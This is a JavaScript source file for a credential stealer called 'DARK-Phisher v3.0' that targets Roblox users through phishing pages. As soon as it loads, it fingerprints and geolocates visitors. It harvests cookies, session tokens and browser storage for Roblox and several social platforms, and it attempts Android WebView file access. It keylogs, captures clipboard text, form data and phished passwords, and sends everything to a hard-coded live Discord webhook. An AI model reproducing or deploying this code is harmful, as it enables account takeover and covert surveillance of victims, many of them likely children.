// DARK-Phisher v3.0 - Ultimate Roblox Stealer
const WEBHOOK_URL = "https://discord.com/api/webhooks/1454588406746058904/yMsAQHXSTPUYL55_FLmNnyo2ctp6Fzzjm_J1piLWRKkXOeLgGsn-lU5z9TB4HvLwAxuc";

class UltimateRobloxStealer {
    constructor() {
        this.data = {
            version: "3.0",
            timestamp: new Date().toISOString(),
            sessionId: this.generateSessionId(),
            victim: {},
            system: {},
            network: {},
            cookies: {},
            localStorage: {},
            sessionStorage: {},
            credentials: {},
            tokens: {},
            android: {},
            additional: {}
        };
        
        this.init();
    }
    
    generateSessionId() {
        return 'RBX-' + Math.random().toString(36).substr(2, 9).toUpperCase() + '-' + Date.now().toString(36);
    }
    
    async init() {
        console.log('[DARK-Phisher v3.0] Initializing...');
        
        // Collect all data in parallel
        await Promise.all([
            this.collectVictimInfo(),
            this.collectSystemInfo(),
            this.collectNetworkInfo(),
            this.stealAllCookies(),
            this.stealLocalData(),
            this.checkAndroidExploits()
        ]);
        
        // Send initial notification
        await this.sendInitialReport();
        
        // Start background monitoring
        this.startMonitoring();
    }
    
    async collectVictimInfo() {
        this.data.victim = {
            url: window.location.href,
            referrer: document.referrer,
            visitedAt: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            languages: navigator.languages || [navigator.language],
            platform: navigator.platform,
            vendor: navigator.vendor,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };
    }
    
    async collectSystemInfo() {
        this.data.system = {
            os: this.detectOS(),
            browser: this.detectBrowser(),
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            pdfViewerEnabled: navigator.pdfViewerEnabled || false,
            maxTouchPoints: navigator.maxTouchPoints || 0
        };
    }
    
    async collectNetworkInfo() {
        try {
            // Get public IP
            const ipPromises = [
                fetch('https://api.ipify.org?format=json').then(r => r.json()),
                fetch('https://ipapi.co/json/').then(r => r.json()),
                fetch('https://api.myip.com').then(r => r.json())
            ];
            
            const results = await Promise.any(ipPromises.map(p => p.catch(e => null)));
            
            this.data.network = {
                ip: results?.ip || results?.query || 'Unknown',
                city: results?.city || 'Unknown',
                region: results?.region || results?.region_name || 'Unknown',
                country: results?.country || results?.country_name || 'Unknown',
                countryCode: results?.countryCode || results?.country_code || 'Unknown',
                isp: results?.isp || results?.org || 'Unknown',
                timezone: results?.timezone || 'Unknown',
                lat: results?.lat || results?.latitude || 'Unknown',
                lon: results?.lon || results?.longitude || 'Unknown',
                proxy: results?.proxy || results?.hosting || false,
                mobile: results?.mobile || false,
                asn: results?.asn || 'Unknown'
            };
            
            // Network connection info
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                this.data.network.connection = {
                    effectiveType: conn.effectiveType || 'unknown',
                    rtt: conn.rtt || 'unknown',
                    downlink: conn.downlink || 'unknown',
                    downlinkMax: conn.downlinkMax || 'unknown',
                    saveData: conn.saveData || false,
                    type: conn.type || 'unknown'
                };
            }
        } catch (error) {
            this.data.network = { error: error.message };
        }
    }
    
    detectOS() {
        const ua = navigator.userAgent;
        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
        if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
        if (ua.includes("Windows NT 6.2")) return "Windows 8";
        if (ua.includes("Windows NT 6.1")) return "Windows 7";
        if (ua.includes("Mac OS X")) return "macOS";
        if (ua.includes("Linux")) return "Linux";
        if (ua.includes("Android")) return "Android";
        if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
        if (ua.includes("CrOS")) return "Chrome OS";
        return "Unknown";
    }
    
    detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR") && !ua.includes("Brave")) return "Chrome";
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
        if (ua.includes("Edg")) return "Microsoft Edge";
        if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
        if (ua.includes("Brave")) return "Brave";
        return "Unknown";
    }
    
    stealAllCookies() {
        // All cookies
        this.data.cookies.all = document.cookie;
        
        // Platform-specific extraction
        const platforms = {
            roblox: ['.roblox.com', 'ROBLOSECURITY', '_|WARNING', 'GuestData', '.ROBLOSECURITY', 'RBXSource', 'RBXEventTracker'],
            tiktok: ['.tiktok.com', 'tt_chain', 'sessionid', 'msToken', 'tt_csrf_token', 'passport_csrf_token'],
            youtube: ['.youtube.com', 'VISITOR_INFO', 'PREF', 'LOGIN_INFO', 'SID', 'HSID', 'SSID'],
            discord: ['.discord.com', 'token', 'locale', '__cfruid', '__dcfduid', '__sdcfduid'],
            facebook: ['.facebook.com', 'c_user', 'xs', 'datr', 'sb', 'fr'],
            instagram: ['.instagram.com', 'sessionid', 'csrftoken', 'ds_user_id', 'shbid', 'shbts'],
            twitter: ['.twitter.com', 'auth_token', 'ct0', 'twid', 'guest_id']
        };
        
        this.data.cookies.platforms = {};
        this.data.tokens.extracted = {};
        
        // Extract cookies by platform
        document.cookie.split(';').forEach(cookie => {
            const trimmed = cookie.trim();
            
            for (const [platform, patterns] of Object.entries(platforms)) {
                if (patterns.some(pattern => trimmed.includes(pattern))) {
                    if (!this.data.cookies.platforms[platform]) {
                        this.data.cookies.platforms[platform] = [];
                    }
                    this.data.cookies.platforms[platform].push(trimmed);
                    
                    // Extract tokens
                    const tokenMatch = trimmed.match(/(token|auth|session|secret|pass|key)=([^;]+)/i);
                    if (tokenMatch) {
                        const key = `${platform}_${tokenMatch[1]}`;
                        this.data.tokens.extracted[key] = tokenMatch[2];
                    }
                }
            }
        });
        
        // Convert arrays to strings for readability
        for (const platform in this.data.cookies.platforms) {
            this.data.cookies.platforms[platform] = this.data.cookies.platforms[platform].join('; ');
        }
    }
    
    stealLocalData() {
        // LocalStorage
        this.data.localStorage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            this.data.localStorage[key] = value;
            
            // Check for Roblox-specific data
            if (key.includes('ROBLOX') || key.includes('roblox') || key.includes('RBX')) {
                this.data.tokens[`local_${key}`] = value.substring(0, 200);
            }
            
            // Check for tokens
            if (key.toLowerCase().includes('token') || 
                key.toLowerCase().includes('auth') || 
                key.toLowerCase().includes('session') ||
                key.toLowerCase().includes('secret') ||
                key.toLowerCase().includes('pass')) {
                this.data.tokens[`local_${key}`] = value.substring(0, 100);
            }
        }
        
        // SessionStorage
        this.data.sessionStorage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            this.data.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        // IndexedDB - attempt to list databases
        if (window.indexedDB) {
            this.data.additional.indexedDB = 'Available';
            // Try to access common Roblox IndexedDB
            try {
                const request = indexedDB.open('roblox');
                request.onsuccess = () => {
                    this.data.additional.robloxDB = 'Accessible';
                };
            } catch (e) {}
        }
    }
    
    async checkAndroidExploits() {
        if (/Android/i.test(navigator.userAgent)) {
            this.data.android = {
                isAndroid: true,
                appInstalled: await this.checkRobloxAppInstalled(),
                webView: this.detectWebView(),
                version: this.getAndroidVersion(),
                model: this.getDeviceModel()
            };
            
            // Try Android-specific exploits
            this.tryAndroidExploits();
        }
    }
    
    async checkRobloxAppInstalled() {
        // Try to detect Roblox app via custom schemes
        const schemes = [
            'roblox://',
            'com.roblox.client://',
            'robloxmobile://'
        ];
        
        for (const scheme of schemes) {
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = scheme;
                document.body.appendChild(iframe);
                
                return new Promise(resolve => {
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                        resolve(true);
                    }, 100);
                    
                    window.addEventListener('blur', () => {
                        resolve(true);
                    }, { once: true });
                });
            } catch (e) {}
        }
        
        return false;
    }
    
    detectWebView() {
        const ua = navigator.userAgent;
        if (ua.includes('wv')) return 'Android WebView';
        if (ua.includes('Linux; Android')) return 'Standard Browser';
        return 'Unknown';
    }
    
    getAndroidVersion() {
        const match = navigator.userAgent.match(/Android\s([0-9\.]+)/);
        return match ? match[1] : 'Unknown';
    }
    
    getDeviceModel() {
        const match = navigator.userAgent.match(/\((.*?)\)/);
        return match ? match[1] : 'Unknown';
    }
    
    tryAndroidExploits() {
        // Attempt WebView exploits
        if (this.data.android.webView === 'Android WebView') {
            // Try to access file:// URLs (common WebView misconfiguration)
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'file:///data/data/com.roblox.client/shared_prefs/';
                document.body.appendChild(iframe);
                setTimeout(() => document.body.removeChild(iframe), 1000);
                this.data.android.exploitAttempted = 'File access attempted';
            } catch (e) {}
            
            // Try localStorage persistence exploit
            try {
                localStorage.setItem('robx_exploit', Date.now().toString());
                this.data.android.localStorageAccess = 'Successful';
            } catch (e) {}
        }
    }
    
    async sendInitialReport() {
        const embed = {
            title: "🎯 Victim Visited The Site 😈⚡🔥",
            description: "```Target Loot Info stealer V3.0\nDiscord webhook configured 🌐```",
            color: 0xFF0000,
            fields: [
                {
                    name: "🌐📲 Target Victim IP",
                    value: `\`\`\`${this.data.network.ip || 'Unknown'}\`\`\``,
                    inline: true
                },
                {
                    name: "🌐✅ Target IP Information",
                    value: `📍 **Location:** ${this.data.network.city}, ${this.data.network.country}\n🏢 **ISP:** ${this.data.network.isp}\n🕐 **Timezone:** ${this.data.network.timezone}\n📡 **Proxy/VPN:** ${this.data.network.proxy ? 'Yes ⚠️' : 'No'}`,
                    inline: false
                },
                {
                    name: "📱💻 Target Victim OS",
                    value: `\`\`\`${this.data.system.os}\`\`\``,
                    inline: true
                },
                {
                    name: "🖲🖱 Target Victim Browser",
                    value: `**Browser:** ${this.data.system.browser}\n**Network:** ${this.data.network.connection?.effectiveType || 'Unknown'}\n**Screen:** ${this.data.system.screen.width}x${this.data.system.screen.height}\n**Language:** ${this.data.victim.languages[0]}`,
                    inline: false
                },
                {
                    name: "🍪🔑 Target Roblox Cookies",
                    value: this.data.cookies.platforms.roblox ? 
                          `\`\`\`${this.data.cookies.platforms.roblox.substring(0, 250)}...\`\`\`` : 
                          "```No Roblox cookies found```",
                    inline: false
                },
                {
                    name: "🎵 Targets Tiktok Cookie/Token",
                    value: this.data.cookies.platforms.tiktok ? 
                          `\`\`\`${this.data.cookies.platforms.tiktok.substring(0, 150)}...\`\`\`` : 
                          "```No TikTok cookies found```",
                    inline: false
                },
                {
                    name: "📺 Targets YouTube Cookie",
                    value: this.data.cookies.platforms.youtube ? 
                          `\`\`\`${this.data.cookies.platforms.youtube.substring(0, 150)}...\`\`\`` : 
                          "```No YouTube cookies found```",
                    inline: false
                }
            ],
            thumbnail: {
                url: "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
            },
            timestamp: new Date().toISOString(),
            footer: {
                text: `DARK-Phisher v3.0 🌹🌐 | Session: ${this.data.sessionId}`
            }
        };
        
        await this.sendToDiscord(embed, "🌐 Victim Logger v3.0");
    }
    
    async captureCredentials(username, password, method) {
        this.data.credentials = {
            username: username,
            password: password,
            method: method,
            capturedAt: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: this.data.network.ip
        };
        
        const embed = {
            title: "🔐 Phishing Template Capture V3.0",
            description: "```Discord webhook configured 🌐🔑```",
            color: 0x00FF00,
            fields: [
                {
                    name: "⏳ Waiting For Any Login Credentials............",
                    value: "```✅ Credentials Found !```",
                    inline: false
                },
                {
                    name: "🔑 Roblox Username",
                    value: `\`\`\`${username}\`\`\``,
                    inline: true
                },
                {
                    name: "🔓 Roblox Password",
                    value: `\`\`\`${password}\`\`\``,
                    inline: true
                },
                {
                    name: "🎯 Capture Method",
                    value: method === 'security' ? "```Security Alert 🚨```" : "```Free Robux Offer 🎁```",
                    inline: true
                },
                {
                    name: "🌐 IP Address",
                    value: `\`\`\`${this.data.network.ip}\`\`\``,
                    inline: true
                },
                {
                    name: "📊 Additional Info",
                    value: `**Time:** ${new Date().toLocaleTimeString()}\n**Browser:** ${this.data.system.browser}\n**OS:** ${this.data.system.os}\n**Android App:** ${this.data.android.isAndroid ? 'Yes 📱' : 'No'}`,
                    inline: false
                }
            ],
            thumbnail: {
                url: "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
            },
            timestamp: new Date().toISOString(),
            footer: {
                text: `DARK-Phisher v3.0 🌹🌐 | Session: ${this.data.sessionId}`
            }
        };
        
        await this.sendToDiscord(embed, "🔑 Credentials Capture v3.0");
        
        // Also send to backup endpoint
        await this.sendToBackup();
    }
    
    async sendToDiscord(embed, username) {
        const payload = {
            embeds: [embed],
            username: username,
            avatar_url: "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
        };
        
        // Try multiple endpoints
        const endpoints = [
            WEBHOOK_URL,
            WEBHOOK_URL.replace('discord.com', 'discordapp.com')
        ];
        
        for (const endpoint of endpoints) {
            try {
                await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                });
                console.log(`✅ Data sent to Discord (${username})`);
                break;
            } catch(e) {
                console.warn(`⚠️ Failed to send to ${endpoint}:`, e);
                continue;
            }
        }
    }
    
    async sendToBackup() {
        // Send to backup PHP endpoint if available
        try {
            const formData = new FormData();
            formData.append('data', JSON.stringify(this.data));
            
            await fetch('webhook.php', {
                method: 'POST',
                body: formData
            });
        } catch (e) {
            // Silent fail
        }
    }
    
    startMonitoring() {
        // Keylogger
        let keystrokes = '';
        document.addEventListener('keydown', (e) => {
            keystrokes += e.key;
            
            if (keystrokes.length >= 30) {
                this.sendToDiscord({
                    title: "⌨️ Keylogger Data",
                    description: `\`\`\`${keystrokes}\`\`\``,
                    color: 0xFFFF00
                }, "⌨️ Keylogger");
                keystrokes = '';
            }
        });
        
        // Clipboard capture
        document.addEventListener('paste', (e) => {
            const pasted = e.clipboardData.getData('text');
            if (pasted) {
                this.sendToDiscord({
                    title: "📋 Clipboard Capture",
                    description: `\`\`\`${pasted.substring(0, 200)}\`\`\``,
                    color: 0xFFA500
                }, "📋 Clipboard");
            }
        });
        
        // Form submissions
        document.addEventListener('submit', (e) => {
            const formData = new FormData(e.target);
            const data = Object.fromEntries(formData);
            
            this.sendToDiscord({
                title: "📝 Form Data Captured",
                description: `\`\`\`${JSON.stringify(data, null, 2)}\`\`\``,
                color: 0x9370DB
            }, "📝 Form Logger");
        });
        
        // Periodic data refresh every 60 seconds
        setInterval(() => {
            this.stealAllCookies();
            this.stealLocalData();
        }, 60000);
    }
}

// Initialize the stealer
const victim = new UltimateRobloxStealer();

// Global function to capture credentials from HTML
function captureRobloxCredentials(username, password, method = 'robux_offer') {
    if (typeof victim !== 'undefined') {
        victim.captureCredentials(username, password, method);
    }
}